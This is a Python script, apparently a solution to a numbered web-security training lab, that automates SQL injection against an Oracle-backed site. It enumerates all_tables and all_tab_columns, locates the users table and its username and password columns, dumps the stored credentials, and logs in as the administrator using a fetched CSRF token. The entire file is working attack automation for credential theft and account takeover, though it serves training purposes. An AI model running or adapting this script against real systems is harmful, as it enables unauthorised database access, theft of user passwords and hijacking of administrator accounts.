#!/usr/bin/env python3
"""SQL injection attack, listing the database contents on Oracle"""

import re

import lab_08

class Lab(lab_08.Lab):
    """Wrapper"""

def main() -> None:
    """Entry point"""
    site = Lab(key="category", path="/filter")
    if site.columns_of_string_type(table="DUAL") != [0, 1]:
        raise RuntimeError(f"Expected [0, 1]; got {site.columns_of_string_type()}")

    response = site.dump_table(["table_name", "NULL"],
                               table="all_tables")
    tables = site.parse_html_table(response.text)
    users_table = [table for table in tables if re.match("^users_", table,
                                                         re.IGNORECASE)][0]

    response = site.dump_table(["column_name", "NULL"],
                               table="all_tab_columns",
                               where=f"table_name='{users_table}'")

    for table in site.parse_html_table(response.text):
        if re.match("^username_", table, re.IGNORECASE):
            username_table = table
        if re.match("^password_", table, re.IGNORECASE):
            password_table = table

    response = site.dump_table([username_table, password_table],
                               table=users_table)
    users = site.parse_html_user_table(response.text)
    admin = [user for user in users if user.name == "administrator"][0]

    csrf = site.csrf_token("/login")
    response = site.login(admin.name, admin.password, csrf=csrf)
    response.raise_for_status()
    print(response.status_code)

if __name__ == "__main__":
    main()
